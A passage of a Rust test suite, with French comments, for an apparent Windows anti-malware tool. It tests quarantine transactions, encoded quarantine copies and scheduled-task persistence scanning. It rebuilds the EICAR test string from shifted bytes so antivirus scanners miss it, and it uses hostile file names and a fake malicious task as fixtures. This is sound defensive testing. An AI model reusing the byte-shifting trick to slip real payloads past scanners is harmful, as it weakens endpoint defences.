        assert_eq!(decision_reprise(Terminee, o, true), Reprise::Rien);
        assert!(matches!(decision_reprise(Terminee, o, false), Reprise::Signaler(_)));
    }
    assert_eq!(decision_reprise(Restauree, Identique, true), Reprise::RetirerCopieEtEntree);
    assert_eq!(decision_reprise(Restauree, Different, true), Reprise::RemettreTerminee);
    assert_eq!(decision_reprise(Restauree, Absent, true), Reprise::RemettreTerminee);
    assert_eq!(decision_reprise(Restauree, Identique, false), Reprise::RetirerEntree);
    assert_eq!(decision_reprise(Restauree, Different, false), Reprise::RetirerEntree);
    assert!(matches!(decision_reprise(Restauree, Absent, false), Reprise::Signaler(_)));
}

#[test]
fn lot1bis_echec_du_manifeste_etat_reel_des_fichiers() {
    use crate::reponse::{quarantaine_transaction, reprendre_quarantaine, EtatQuarantaine, ElementQuarantaine};
    use std::os::windows::fs::OpenOptionsExt;
    let d = dossier_test("transaction");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let copies = || std::fs::read_dir(&dq).map(|l| l.count()).unwrap_or(0);

    // 1. Échec du premier enregistrement (« en_cours ») : copie retirée, original intact, rien d'enregistré
    let f = d.join("a.exe");
    std::fs::write(&f, b"AAA").unwrap();
    let m = Manifeste::new(&d, 1);
    let mut liste = Vec::new();
    assert!(quarantaine_transaction(&dq, &mut liste, &f, "a", "t", &sddl, &|l| m.ecrire(l)).is_err());
    assert_eq!(std::fs::read(&f).unwrap(), b"AAA");
    assert!(liste.is_empty() && copies() == 0 && m.lu().is_empty());

    // 2. Original impossible à supprimer (tenu ouvert) : copie et entrée retirées, original intact
    let m = Manifeste::new(&d, 0);
    {
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0x1).open(&f).unwrap();
        assert!(quarantaine_transaction(&dq, &mut liste, &f, "a", "t", &sddl, &|l| m.ecrire(l)).is_err());
    }
    assert_eq!(std::fs::read(&f).unwrap(), b"AAA");
    assert!(liste.is_empty() && copies() == 0 && m.lu().is_empty());

    // 3. Échec du dernier enregistrement (« terminee ») : original supprimé, copie en place, entrée
    //    enregistrée « en_cours » ; la reprise au démarrage la termine
    let m = Manifeste::new(&d, 2);
    quarantaine_transaction(&dq, &mut liste, &f, "a", "t", &sddl, &|l| m.ecrire(l)).unwrap();
    assert!(!f.exists() && copies() == 1);
    let mut lu = m.lu();
    assert_eq!(lu[0].etat(), EtatQuarantaine::EnCours);
    reprendre_quarantaine(&dq, &mut lu);
    assert_eq!(lu[0].etat(), EtatQuarantaine::Terminee);
    let mut liste = lu;

    // 3 bis. « en_cours », original remplacé par un autre fichier au même chemin : la copie est gardée
    let mut autre_fichier = liste.clone();
    autre_fichier[0].etat = "en_cours".into();
    std::fs::write(&f, b"un autre fichier").unwrap();
    reprendre_quarantaine(&dq, &mut autre_fichier);
    assert_eq!(autre_fichier[0].etat(), EtatQuarantaine::Terminee);
    assert!(copies() == 1, "copie gardée");
    std::fs::remove_file(&f).unwrap();

    // 4. Restauration, échec de l'enregistrement « restauree » : fichier restauré retiré, copie et entrée intactes
    let m = Manifeste::new(&d, 1);
    assert!(restaurer_test(&dq, &mut liste, "a", &|l| m.ecrire(l)).is_err());
    assert!(!f.exists() && copies() == 1 && liste[0].etat() == EtatQuarantaine::Terminee);

    // 5. Dossier d'origine impossible à créer (un fichier à sa place) : erreur avant toute copie
    let bloque = d.join("bloque");
    std::fs::write(&bloque, b"").unwrap();
    let mut autre = liste.clone();
    autre[0].chemin_origine = bloque.join("sous").join("a.exe").display().to_string();
    let m = Manifeste::new(&d, 0);
    assert!(restaurer_test(&dq, &mut autre, "a", &|l| m.ecrire(l)).unwrap_err().contains("dossier d'origine"));
    assert!(copies() == 1 && m.appels.get() == 0, "rien de copié ni d'enregistré");

    // 6. Restauration interrompue après l'enregistrement « restauree » : la reprise retire la copie et l'entrée
    let m = Manifeste::new(&d, 2);
    restaurer_test(&dq, &mut liste, "a", &|l| m.ecrire(l)).unwrap();
    assert_eq!(std::fs::read(&f).unwrap(), b"AAA");
    let mut lu = m.lu();
    assert_eq!(lu[0].etat(), EtatQuarantaine::Restauree);
    std::fs::write(dq.join(lu[0].nom_fichier().unwrap()), b"AAA").unwrap(); // copie encore présente (retrait raté)
    reprendre_quarantaine(&dq, &mut lu);
    assert!(lu.is_empty() && copies() == 0);

    // 7. Copie orpheline (sans entrée) : signalée et conservée
    std::fs::write(dq.join("orpheline.quarantaine"), b"x").unwrap();
    let mut vide: Vec<ElementQuarantaine> = Vec::new();
    let messages = reprendre_quarantaine(&dq, &mut vide);
    assert!(messages.iter().any(|m| m.contains("orpheline")) && dq.join("orpheline.quarantaine").exists());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_migration_echec_du_manifeste_ancienne_copie_gardee() {
    use crate::reponse::{migrer_quarantaine, ElementQuarantaine};
    let d = dossier_test("migration-echec");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    std::fs::create_dir_all(&dq).unwrap();
    std::fs::write(dq.join("ancien.quarantaine"), b"precieux").unwrap();
    let mut liste = vec![ElementQuarantaine { id: "ancien".into(), chemin_origine: d.join("x").display().to_string(), ..Default::default() }];
    let avant = liste.clone();
    let m = Manifeste::new(&d, 1);
    let messages = migrer_quarantaine(&dq, &mut liste, &sddl, |_| Some(false), &|l| m.ecrire(l));
    assert!(messages[0].contains("NON migrée"), "{messages:?}");
    assert_eq!(liste, avant, "entrée inchangée");
    assert_eq!(std::fs::read(dq.join("ancien.quarantaine")).unwrap(), b"precieux", "ancienne copie gardée");
    assert_eq!(std::fs::read_dir(&dq).unwrap().count(), 1, "nouvelle copie retirée");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_deplacement_impossible_intact_et_echec_ferme() {
    use std::os::windows::fs::OpenOptionsExt;
    let d = dossier_test("intact");
    let f = d.join("config.json");
    std::fs::write(&f, b"{\"piege\":1}").unwrap();
    let mut ecartes = Vec::new();
    {
        // Tenu ouvert sans partage de suppression ; propriétaire déclaré non vérifié (à écarter)
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0x1).open(&f).unwrap();
        crate::protection::trier_avec(&d, &d, &d.join("ecartes"), &mut ecartes, &|_| Some(false));
    }
    assert!(ecartes.iter().any(|e| e.starts_with("config.json") && e.contains("IMPOSSIBLE")), "{ecartes:?}");
    assert_eq!(std::fs::read(&f).unwrap(), b"{\"piege\":1}", "jamais supprimé");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_creation_de_ecartes_impossible_intact_et_echec_ferme() {
    let d = dossier_test("sans-ecartes");
    let f = d.join("apprentissage.json");
    std::fs::write(&f, b"[]").unwrap();
    let mut ecartes = Vec::new();
    // Dossier de mise à l'écart impossible à créer (parent absent)
    crate::protection::trier_avec(&d, &d, &d.join("absent").join("ecartes"), &mut ecartes, &|_| Some(false));
    assert!(ecartes.iter().any(|e| e.starts_with("apprentissage.json") && e.contains("IMPOSSIBLE")), "{ecartes:?}");
    assert_eq!(std::fs::read(&f).unwrap(), b"[]", "jamais supprimé");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_ecartes_suspect_mis_de_cote_sans_suppression() {
    let d = dossier_test("ecartes-suspect");
    let q = d.join("ecartes");
    std::fs::create_dir_all(&q).unwrap();
    std::fs::write(q.join("piece.json"), b"garde").unwrap();
    // Propriétaire déclaré non vérifié : ecartes est mis de côté
    crate::protection::preparer_quarantaine_avec(&q, &|_| Some(false)).unwrap();
    assert!(!q.exists());
    let suspect = std::fs::read_dir(&d).unwrap().flatten().find(|e| e.file_name().to_string_lossy().starts_with("ecartes-suspect-")).unwrap().path();
    assert_eq!(std::fs::read(suspect.join("piece.json")).unwrap(), b"garde", "contenu conservé");
    let _ = std::fs::remove_dir_all(&d);
}

fn contient(foin: &[u8], aiguille: &[u8]) -> bool {
    foin.windows(aiguille.len()).any(|w| w == aiguille)
}

/// Chaîne de test EICAR (68 octets), reconstituée en mémoire à partir d'octets décalés de +1 : elle ne figure
/// ni dans ce source ni dans le binaire de test (Defender supprimerait l'un ou l'autre), et n'est jamais
/// écrite sur le disque
fn eicar() -> Vec<u8> {
    const DECALES: &[u8] = &[89, 54, 80, 34, 81, 38, 65, 66, 81, 92, 53, 93, 81, 91, 89, 54, 53, 41, 81, 95, 42, 56, 68, 68, 42, 56,
        126, 37, 70, 74, 68, 66, 83, 46, 84, 85, 66, 79, 69, 66, 83, 69, 46, 66, 79, 85, 74, 87, 74, 83, 86, 84, 46, 85, 70, 84, 85,
        46, 71, 74, 77, 70, 34, 37, 73, 44, 73, 43];
    DECALES.iter().map(|o| o - 1).collect()
}

#[test]
fn lot1bis_copie_encodee_jamais_en_clair() {
    use crate::reponse::{encoder_flux, entete_encodage, est_encodee, nonce_de, quarantaine_transaction};
    // En mémoire : la chaîne EICAR encodée ne contient plus la chaîne, ni aucun de ses motifs de 8 octets
    let e = eicar();
    assert_eq!(e.len(), 68);
    let nonce = nonce_de("test.quarantaine");
    let mut encode = e.clone();
    encoder_flux(&nonce, 0, &mut encode);
    for w in e.windows(8) {
        assert!(!contient(&encode, w), "motif {:?}", String::from_utf8_lossy(w));
    }
    let mut decode = encode.clone();
    encoder_flux(&nonce, 0, &mut decode);
    assert_eq!(decode, e, "réversible");
    // Encodage par morceaux (positions) identique à l'encodage d'un seul tenant
    let mut morceaux = e.clone();
    let (a, b) = morceaux.split_at_mut(13);
    encoder_flux(&nonce, 0, a);
    encoder_flux(&nonce, 13, b);
    assert_eq!(morceaux, encode);
    assert_eq!(entete_encodage(&nonce).len(), 21);

    // Sur le disque : contenu très répétitif (le pire cas pour un XOR à clé courte), mis en quarantaine
    let d = dossier_test("encodage");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let f = d.join("journal.txt");
    let contenu: Vec<u8> = b"ligne de test deR4Tizer, identique a chaque fois : 0123456789\r\n".repeat(3000);
    std::fs::write(&f, &contenu).unwrap();
    let m = Manifeste::new(&d, 0);
    let mut liste = Vec::new();
    quarantaine_transaction(&dq, &mut liste, &f, "enc", "test", &sddl, &|l| m.ecrire(l)).unwrap();
    let chemin_copie = dq.join(liste[0].nom_fichier().unwrap());
    let copie = std::fs::read(&chemin_copie).unwrap();
    assert!(est_encodee(&chemin_copie) && copie.starts_with(b"D4TQ"));
    for motif in [&b"ligne de test"[..], b"deR4Tizer", b"0123456789"] {
        assert!(!contient(&copie, motif), "motif en clair : {}", String::from_utf8_lossy(motif));
    }
    // Aucune fenêtre de 16 octets du contenu d'origine ne se retrouve dans la copie
    let fenetres: std::collections::HashSet<&[u8]> = contenu.windows(16).collect();
    assert!(!copie.windows(16).any(|w| fenetres.contains(w)));
    // Restauration identique à l'octet
    restaurer_test(&dq, &mut liste, "enc", &|l| m.ecrire(l)).unwrap();
    assert_eq!(std::fs::read(&f).unwrap(), contenu);
    let _ = std::fs::remove_dir_all(&d);
}

// ------------------------------------------------------------ lot 1 ter : opérations SYSTEM sur des chemins de l'utilisateur

/// Restauration de test à l'emplacement d'origine de l'entrée, avec la création sans lien (en service, la
/// même création se fait sous l'identité du propriétaire)
fn restaurer_test(dq: &std::path::Path, liste: &mut Vec<crate::reponse::ElementQuarantaine>, id: &str,
                  ecrire: crate::reponse::EcrireManifeste) -> Result<String, String> {
    let cible = std::path::PathBuf::from(&liste.iter().find(|e| e.id == id).ok_or("élément introuvable")?.chemin_origine);
    crate::reponse::restaurer_transaction(dq, liste, id, &cible, &crate::reponse::creer_sans_lien, ecrire)
}

#[test]
fn secrets_illisibles_issue_selon_la_cause() {
    use crate::notifications::message_secrets_illisibles as m;
    assert!(!m(true).contains("supprime "), "protection en échec : les secrets sont sans doute valides");
    assert!(m(true).contains("protection"));
    assert!(m(false).contains("supprime "));
}

/// Fichier, dossier, jonction, ou rien, sous le nom de la tâche (constaté en VM : un fichier empêche la création)
#[test]
fn relance_element_precree_ecarte() {
    use crate::relance::ecarter_precree as e;
    let d = dossier_taches("precree");
    let c = d.join("tache");
    e(&c).unwrap();
    std::fs::write(&c, "x").unwrap();
    e(&c).unwrap();
    assert!(!c.exists(), "fichier");
    std::fs::create_dir_all(c.join("sous")).unwrap();
    std::fs::write(c.join(r"sous\f"), "x").unwrap();
    e(&c).unwrap();
    assert!(!c.exists(), "dossier non vide");
    let garde = d.join("garde");
    std::fs::create_dir(&garde).unwrap();
    std::fs::write(garde.join("precieux"), "x").unwrap();
    jonction(&c, &garde);
    e(&c).unwrap();
    assert!(std::fs::symlink_metadata(&c).is_err(), "jonction retirée");
    assert!(garde.join("precieux").exists(), "ce qu'elle désigne reste");
    std::fs::remove_dir_all(&d).unwrap();
}

fn dossier_taches(nom: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("d4t-taches-{nom}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn bornes_taches() -> crate::persistance::BornesTaches {
    crate::persistance::BornesTaches { profondeur: 3, par_dossier: 50, enumeres: 1000, dossiers: 10, anomalies: 2 }
}

/// Audits de #102 et #103 : une jonction n'est pas suivie ; un fichier sans tâche enregistrée est une anomalie, pas une tâche
#[test]
fn taches_examen_jonction_et_fichier_sans_tache() {
    use crate::persistance::{examiner_dossier_taches as x, Fichier as F};
    let d = dossier_taches("jonction");
    std::fs::write(d.join("vraie"), "x").unwrap();
    std::fs::write(d.join("fausse"), "x").unwrap();
    jonction(&d.join("boucle"), &d);
    let mut b = bornes_taches();
    b.anomalies = 5;
    let mut a = x(&d, &b, &mut |n, _| if n == r"\vraie" { F::Enregistre } else { F::SansTache });
    a.sort();
    assert_eq!(a, [(r"\boucle".to_string(), "lien non suivi".to_string()), (r"\fausse".to_string(), "fichier sans tâche enregistrée".to_string())], "aucun parcours par la jonction");
    // Revérification impossible : pas de conclusion, pas d'alerte sur le fichier (D7)
    let a = x(&d, &b, &mut |_, _| F::Inconnu);
    assert!(!a.iter().any(|(_, m)| m == "fichier sans tâche enregistrée"), "{a:?}");
    assert!(a.iter().any(|(n, _)| n.contains("revérifications")), "{a:?}");
    std::fs::remove_dir(d.join("boucle")).unwrap();
    std::fs::remove_dir_all(&d).unwrap();
}

/// Rien n'est ouvert : un fichier tenu sans partage ne gêne pas l'examen. Le source n'ouvre rien (un verrou opportuniste ferait attendre)
#[test]
fn taches_examen_n_ouvre_aucun_fichier() {
    use std::os::windows::fs::OpenOptionsExt;
    let d = dossier_taches("ouvert");
    let f = d.join("tenu");
    std::fs::write(&f, "x").unwrap();
    let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0).open(&f).unwrap();
    assert!(crate::persistance::examiner_dossier_taches(&d, &bornes_taches(), &mut |_, _| crate::persistance::Fichier::Enregistre).is_empty());
    let s = include_str!("persistance.rs").replace("\r\n", "\n");
    let a = s.find("pub(crate) fn examiner_dossier_taches").unwrap();
    let corps = &s[a..a + s[a..].find("\npub(crate) fn plafonner_nouvelles_taches").unwrap()];
    assert!(!corps.contains("File::open") && !corps.contains("fs::read(") && !corps.contains("OpenOptions") && !corps.contains("lire_securite"), "ouverture dans l'examen");
    assert!(s.contains("dossier.GetTasks(TASK_ENUM_HIDDEN.0)"), "tâches cachées non demandées");
    drop(_tenu);
    std::fs::remove_dir_all(&d).unwrap();
}

/// Correction du FP « tâches VS » : un orphelin du dossier des tâches n'est une anomalie que si son propriétaire
/// n'est pas de confiance. Un compte non privilégié ne peut forger un propriétaire SYSTEM/administrateurs, donc un
/// vrai fichier planté reste signalé ; un artefact d'installeur admin (propriétaire de confiance) ne l'est plus ;
/// propriétaire illisible → anomalie conservée (échec fermé)
#[test]
fn anomalie_sans_tache_selon_proprietaire() {
    use crate::persistance::anomalie_sans_tache as a;
    assert!(!a(Some(true)), "propriétaire de confiance : artefact d'installeur admin, pas une anomalie");
    assert!(a(Some(false)), "propriétaire non de confiance : fichier posé par un compte non privilégié, anomalie");
    assert!(a(None), "propriétaire illisible : anomalie conservée (échec fermé)");
}

/// D1, S106-04 : la revérification s'arrête au plafond d'anomalies : des fichiers vides ne font pas interroger le Planificateur sans fin
#[test]
fn taches_examen_appels_bornes() {
    let d = dossier_taches("appels");
    for i in 0..40 {
        std::fs::write(d.join(format!("f{i}")), "x").unwrap();
    }
    let mut appels = 0;
    let a = crate::persistance::examiner_dossier_taches(&d, &bornes_taches(), &mut |_, _| { appels += 1; crate::persistance::Fichier::SansTache });
    assert_eq!(appels, 2, "plus aucune interrogation une fois les anomalies au plafond");
    assert!(a.iter().any(|(n, _)| n.contains("anomalies")), "{a:?}");
    std::fs::remove_dir_all(&d).unwrap();
}

#[test]
fn taches_examen_borne() {
    use crate::persistance::{examiner_dossier_taches as x, Fichier as F};
    // Profondeur
    let d = dossier_taches("profondeur");
    std::fs::create_dir_all(d.join(r"a\b\c")).unwrap();
    std::fs::write(d.join(r"a\b\permis"), "x").unwrap();
    std::fs::write(d.join(r"a\b\c\trop-loin"), "x").unwrap();
    let a = x(&d, &bornes_taches(), &mut |_, _| F::SansTache);
    assert!(a.iter().any(|(n, _)| n == r"\a\b\permis"), "{a:?}");
    assert!(!a.iter().any(|(n, _)| n.contains("trop-loin")), "{a:?}");
    assert!(a.iter().any(|(n, _)| n.contains("profondeur")), "{a:?}");
    // Anomalies bornées
    let d2 = dossier_taches("anomalies");
    for i in 0..5 {
        std::fs::write(d2.join(format!("f{i}")), "x").unwrap();
    }
    let a = x(&d2, &bornes_taches(), &mut |_, _| F::SansTache);
    assert_eq!(a.iter().filter(|(_, m)| m == "fichier sans tâche enregistrée").count(), 2, "{a:?}");
    assert!(a.iter().any(|(n, _)| n.contains("anomalies")), "{a:?}");
    // Trop d'éléments dans un dossier : ses fichiers suivants ne sont plus examinés, ses sous-dossiers si (S103-08)
    let d3 = dossier_taches("racine");
    for i in 0..8 {
        std::fs::write(d3.join(format!("a{i}")), "x").unwrap();
    }
    std::fs::create_dir_all(d3.join("z")).unwrap();
    std::fs::write(d3.join(r"z\sans-tache"), "x").unwrap();
    let mut b = bornes_taches();
    b.par_dossier = 3;
    b.anomalies = 100;
    let a = x(&d3, &b, &mut |_, _| F::SansTache);
    assert!(a.iter().any(|(n, _)| n == r"\z\sans-tache"), "sous-dossier trouvé malgré la saturation : {a:?}");
    assert_eq!(a.iter().filter(|(n, _)| n.starts_with(r"\a")).count(), 3, "{a:?}");
    assert!(a.iter().any(|(n, _)| n.contains("éléments")), "{a:?}");
    // Borne dure, et dossiers
    let mut b = bornes_taches();
    b.enumeres = 2;
    b.anomalies = 100;
    assert!(x(&d3, &b, &mut |_, _| F::SansTache).iter().any(|(n, _)| n.contains("éléments")));
    let d4 = dossier_taches("dossiers");
    for i in 0..4 {
        std::fs::create_dir_all(d4.join(format!("d{i}"))).unwrap();
        std::fs::write(d4.join(format!(r"d{i}\f")), "x").unwrap();
    }
    let mut b = bornes_taches();
    b.dossiers = 2;
    b.anomalies = 100;
    let a = x(&d4, &b, &mut |_, _| F::SansTache);
    assert_eq!(a.iter().filter(|(_, m)| m == "fichier sans tâche enregistrée").count(), 2, "{a:?}");
    assert!(a.iter().any(|(n, _)| n.contains("dossiers")), "{a:?}");
    // Ces bornes ne rendent pas le relevé incomplet : les tâches sont lues ailleurs
    assert!(a.iter().all(|(n, _)| !n.contains("relevé incomplet")), "{a:?}");
    for x in [d, d2, d3, d4] {
        std::fs::remove_dir_all(x).unwrap();
    }
}

/// S106-01 : une entrée par action, désactivée dite, commande bornée, action inconnue signalée
#[test]
fn taches_entrees_par_action() {
    use crate::persistance::{entrees_de_tache as e, ActionTache as A};
    let mut l = Vec::new();
    e(&mut l, r"\a", true, &[A::Exec(r"c:\notepad.exe".into(), "".into()), A::Exec(r"c:\mal.exe".into(), "-y".into()), A::Com("{0358B920-0AC7-461F-98F4-58E32CD89148}".into()), A::Autre]);
    assert_eq!(l.len(), 4);
    assert_eq!((l[0].nom.as_str(), l[0].commande.as_str(), l[0].categorie.as_str()), (r"\a", r"c:\notepad.exe", "Tâche planifiée"));
    assert_eq!((l[1].nom.as_str(), l[1].commande.as_str()), (r"\a : action 2", r"c:\mal.exe -y"), "la seconde action a son entrée");
    assert!(l[2].commande.starts_with("COM {0358B920"));
    assert!(!l[3].anomalie, "elle vient de la tâche : dans la file, pas une anomalie du service (S106-21)");
    assert!(crate::persistance::evaluer(&l[3]).contains("action non reconnue"), "jugée suspecte");
    assert!(!l[0].anomalie && !l[1].anomalie);
    let mut l = Vec::new();
    e(&mut l, r"\b", false, &[A::Exec("x".into(), "".into())]);
    assert_eq!(l[0].nom, r"\b : désactivée");
    let mut l = Vec::new();
    e(&mut l, r"\c", true, &[]);
    assert!(!l[0].anomalie && crate::persistance::evaluer(&l[0]).contains("action non reconnue"), "tâche sans action : suspecte, dans la file");
}

/// R1 : une tâche ne peut pas prendre la clé d'une autre : « : » n'existe pas dans un nom de tâche
#[test]
fn taches_noms_sans_collision() {
    use crate::persistance::{entrees_de_tache as e, ActionTache as A};
    let x = || A::Exec("x".into(), "".into());
    let mut l = Vec::new();
    e(&mut l, r"\foo", true, &[x(), x()]);
    e(&mut l, r"\foo (action 2)", true, &[x()]);
    e(&mut l, r"\y", false, &[x()]);
    e(&mut l, r"\y (désactivée)", true, &[x()]);
    let cles: std::collections::HashSet<_> = l.iter().map(|c| c.cle.clone()).collect();
    assert_eq!(cles.len(), l.len(), "clés distinctes");
}

/// R2 : deux commandes qui diffèrent au-delà de la borne donnent des entrées différentes, et la troncature rend l'entrée suspecte
#[test]
fn taches_commande_tronquee_comparable() {
    use crate::persistance::{entrees_de_tache as e, evaluer, ActionTache as A};
    let long = |fin: &str| A::Exec("x".into(), "a".repeat(5000) + fin);
    let (mut l1, mut l2) = (Vec::new(), Vec::new());
    e(&mut l1, r"\d", true, &[long("un")]);
    e(&mut l2, r"\d", true, &[long("deux")]);
    assert!(l1[0].commande.chars().count() < 4300, "commande bornée");
    assert_ne!(l1[0].commande, l2[0].commande, "changement au-delà de la borne visible");
    assert!(evaluer(&l1[0]).contains("tronquée"), "entrée suspecte");
    let mut l3 = Vec::new();
    e(&mut l3, r"\e", true, &[A::Exec("x".into(), "a".repeat(100))]);
    assert!(!evaluer(&l3[0]).contains("tronquée"));
}

/// R3 : une tâche dont la commande imite une anomalie n'en est pas une : ni exemptée du plafond ni « élément anormal »
#[test]
fn taches_anomalie_jamais_deduite_du_texte() {
    use crate::commun::EntreeDemarrage as E;
    use crate::persistance::{entrees_de_tache as e, evaluer, garder_taches_non_vues, plafonner_nouvelles_taches as p, ActionTache as A, ANOMALIE_TACHES};
    let imite = format!("{ANOMALIE_TACHES}lien non suivi");
    let mut l = Vec::new();
    for i in 0..40 {
        e(&mut l, &format!(r"\t{i}"), true, &[A::Exec(imite.clone(), "".into())]);
    }
    assert!(l.iter().all(|x| !x.anomalie));
    assert!(!evaluer(&l[0]).contains("élément anormal"));
    p(&Default::default(), &mut l, 16, &mut Default::default(), 1);
    assert_eq!(l.iter().filter(|x| !x.anomalie).count(), 16, "plafond appliqué");
    let mut faux = vec![E { cle: "Tâche planifiée|x".into(), categorie: "Tâche planifiée".into(), nom: r"\(relevé incomplet : x)".into(), commande: imite, ..Default::default() }];
    assert!(!garder_taches_non_vues(&Default::default(), &mut faux), "pas un relevé incomplet");
}

/// S106-05, S106-13 : au-delà du plafond, les plus anciennes d'abord, celles de \Microsoft avant ; connues et anomalies intactes ; pas de famine
#[test]
fn taches_nouvelles_plafonnees() {
    use crate::commun::EntreeDemarrage as E;
    use crate::persistance::plafonner_nouvelles_taches as p;
    let t = |nom: &str| E { cle: format!("Tâche planifiée|{nom}"), categorie: "Tâche planifiée".into(), nom: nom.into(), commande: "x".into(), ..Default::default() };
    let anomalie = |nom: &str| E { anomalie: true, ..t(nom) };
    let connue = t(r"\connue");
    let reference: std::collections::HashMap<String, E> = [(connue.cle.clone(), connue.clone())].into_iter().collect();
    let run = E { cle: "Run|p".into(), categorie: "Run".into(), nom: "p".into(), commande: "p.exe".into(), ..Default::default() };
    let mut attente = std::collections::HashMap::new();
    let mut r = vec![connue.clone(), t(r"\n1"), t(r"\n2"), t(r"\n3"), anomalie(r"\lien"), run];
    p(&reference, &mut r, 2, &mut attente, 1);
    let noms: Vec<&str> = r.iter().map(|e| e.nom.as_str()).collect();
    assert!(noms.contains(&r"\connue") && noms.contains(&r"\lien") && noms.contains(&"p"), "{noms:?}");
    assert!(noms.contains(&r"\n1") && noms.contains(&r"\n2") && !noms.contains(&r"\n3"), "{noms:?}");
    assert!(r.iter().any(|e| e.nom.contains("plafonnées") && e.anomalie), "{noms:?}");
    // Tour suivant : n1 et n2 sont connues ; une tâche vue avant passe devant une rafale de noms mieux classés
    let reference2: std::collections::HashMap<String, E> = [t(r"\n1"), t(r"\n2")].into_iter().map(|e| (e.cle.clone(), e)).collect();
    let mut r = vec![t(r"\a1"), t(r"\a2"), t(r"\a3"), t(r"\n3")];
    p(&reference2, &mut r, 1, &mut attente, 2);
    assert!(r.iter().any(|e| e.nom == r"\n3") && !r.iter().any(|e| e.nom == r"\a1"), "la plus ancienne d'abord, pas de famine");
    assert!(!attente.contains_key(&t(r"\n3").cle), "levée : plus en attente");
    assert!(attente.contains_key(&t(r"\a1").cle), "les autres attendent");
    // Tâche supprimée pendant son attente : oubliée
    let mut r = vec![t(r"\a2"), t(r"\a3")];
    p(&reference2, &mut r, 1, &mut attente, 3);
    assert!(!attente.contains_key(&t(r"\a1").cle), "supprimée : oubliée");
    // S4 : relevé incomplet : une tâche absente garde son rang
    let mut a4: std::collections::HashMap<String, u64> = [(t(r"\cible").cle, 1)].into_iter().collect();
    let mut r = vec![t(r"\a1"), anomalie(r"\(relevé incomplet : délai)")];
    p(&Default::default(), &mut r, 5, &mut a4, 2);
    assert_eq!(a4.get(&t(r"\cible").cle), Some(&1), "rang gardé");
    let mut r = vec![t(r"\a1"), t(r"\a2"), t(r"\cible")];
    p(&Default::default(), &mut r, 1, &mut a4, 3);
    assert!(r.iter().any(|e| e.nom == r"\cible") && !r.iter().any(|e| e.nom == r"\a1"), "elle passe devant la rafale");
    // T1 : sur un relevé incomplet, l'attente reste bornée
    let mut a5: std::collections::HashMap<String, u64> = (0..20_002).map(|i| (format!("ancien{i}"), 1)).collect();
    let mut r = vec![t(r"\présente"), anomalie(r"\(relevé incomplet : délai)")];
    p(&Default::default(), &mut r, 5, &mut a5, 2);
    assert!(a5.len() <= 1, "élaguée au-delà de la borne : {}", a5.len());
    // \Microsoft d'abord, quel que soit l'ordre
    let mut a2 = std::collections::HashMap::new();
    let mut r = vec![t(r"\AAA"), t(r"\Microsoft\Windows\x")];
    p(&Default::default(), &mut r, 1, &mut a2, 1);
    assert!(r.iter().any(|e| e.nom == r"\Microsoft\Windows\x") && !r.iter().any(|e| e.nom == r"\AAA"));
    // Sous le plafond : rien retiré, pas d'entrée, plus rien en attente
    let mut a3 = std::collections::HashMap::new();
    let mut r2 = vec![connue, t(r"\n1")];
    p(&reference, &mut r2, 2, &mut a3, 1);
    assert_eq!(r2.len(), 2);
    assert!(a3.is_empty());
}

/// S1 : un nom à points ou espaces finaux, ou à surrogate seul, existe sous son nom exact, même si un chemin ordinaire le dit absent
#[test]
fn taches_fichier_hostile_existe_tel_quel() {
    use std::os::windows::ffi::OsStringExt;
    let d = dossier_taches("hostile");
    let mut surrogate: Vec<u16> = "s".encode_utf16().collect();
    surrogate.push(0xD800);
    for nom in [std::ffi::OsString::from("pts..."), std::ffi::OsString::from("esp   "), std::ffi::OsString::from_wide(&surrogate), std::ffi::OsString::from("normal")] {
        let mut exact = std::ffi::OsString::from(r"\\?\");
        exact.push(d.as_os_str());
        exact.push(r"\");
        exact.push(&nom);
        std::fs::write(std::path::PathBuf::from(&exact), "x").unwrap();
        assert!(crate::persistance::existe_tel_quel(&d.join(&nom)), "{nom:?}");
    }
    assert!(!crate::persistance::existe_tel_quel(&d.join("absent")));
    // Le chemin réel de l'entrée arrive à la fonction : chacun peut être nommé
    let mut vus = 0;
    let mut b = bornes_taches();
    b.anomalies = 10;
    crate::persistance::examiner_dossier_taches(&d, &b, &mut |_, p| { if crate::persistance::existe_tel_quel(p) { vus += 1; } crate::persistance::Fichier::Enregistre });
    assert_eq!(vus, 4);
    let mut exact = std::ffi::OsString::from(r"\\?\");
    exact.push(d.as_os_str());
    std::fs::remove_dir_all(std::path::PathBuf::from(exact)).unwrap();
}

/// S2 : deux entrées de même clé, commandes différentes : la seconde ne disparaît pas sans signal ; le relevé garde la première
#[test]
fn taches_doublon_signale() {
    use crate::commun::EntreeDemarrage as E;
    use crate::persistance::dedupliquer_releve as d;
    let t = |c: &str| E { cle: r"Tâche planifiée|\a".into(), categorie: "Tâche planifiée".into(), nom: r"\a".into(), commande: c.into(), ..Default::default() };
    let r = d(vec![t("un"), t("deux"), t("trois")]);
    assert_eq!(r[0].commande, "un");
    assert_eq!(r.iter().filter(|e| e.anomalie).count(), 1, "une seule entrée par nom, libellé stable");
    assert!(r.iter().any(|e| e.anomalie && e.nom.contains("doublon")));
    assert_eq!(d(vec![t("un"), t("un")]).len(), 1, "même commande : pas d'anomalie");
    // T2 : au plus 16, puis une entrée générique
    let paires = |i: usize| { let c = format!(r"Tâche planifiée|\b{i}"); vec![E { cle: c.clone(), categorie: "Tâche planifiée".into(), nom: format!(r"\b{i}"), commande: "un".into(), ..Default::default() }, E { cle: c, categorie: "Tâche planifiée".into(), nom: format!(r"\b{i}"), commande: "deux".into(), ..Default::default() }] };
    let r = d((0..500).flat_map(paires).collect());
    assert_eq!(r.iter().filter(|e| e.anomalie && e.nom.ends_with(": doublon")).count(), 16, "plafond");
    assert_eq!(r.iter().filter(|e| e.anomalie && e.nom.contains("au-delà du plafond")).count(), 1, "une entrée générique");
